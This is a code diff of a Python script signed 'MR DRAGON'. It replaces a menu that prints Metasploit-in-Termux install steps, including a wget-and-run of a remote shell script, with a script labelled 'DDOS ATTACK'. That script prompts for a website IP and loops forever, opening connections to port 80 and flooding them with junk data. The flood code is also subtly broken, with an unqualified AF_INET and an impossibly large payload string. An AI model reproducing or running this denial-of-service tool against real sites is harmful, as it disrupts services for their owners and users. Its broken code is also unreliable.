@@ -1,31 +1,18 @@
-import os 
-os.system ('clear') 
-print ("hello its tool to download termux metasploit")
-print ("        ") 
-print ("to start Type go  ")
-print ("_________________") 
-omar=input ("--->>>"   )
-if omar=="go" : 
-    print ("ok we go")
-    
-else :
-    print ("ERORR  " *9999)
-   
-print ("we can download metasploit in your termux (Tybe meta))")
-print ("________________") 
-omar1=input ("Type meta : ")
-if omar1=="meta" : 
-    print ("""pkg update && pkg upgrade - y
-
-pkg insatll wget
-
-pkg install ruby
-
-wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh
-
-./metasploit.sh""")
-else :
-    print ("ERORR" *1000)
-print ("             ") 
-print ("open new session and copy all") 	
-print ("MR DRAGON, ")
+import os, sys, time
+def slowtype(t):
+   for D in t + "\n":
+   	sys.stdout.write(D)
+   	sys.stdout.flush()
+   	time.sleep(6/100)
+os.system ('clear')
+slowtype ("\033[33;1mDDOS ATTACK PY MR DRAGON")
+print ("___________________")
+import socket
+ip = input ("\033[36;1mEnter ip website : ")
+while True:
+	sock = socket.socket(AF_INET ,socket.SOCK_STREAM)
+	socket.setdefaulttimeout(1)
+	conn = sock.connect((ip,80))
+	data = ("\033[31mjdirir8rjdjd8rjddjdjdnfnfnfn"*999999999999)
+	sock.send(data)
+	print ("ATTACKING IN IP",ip )
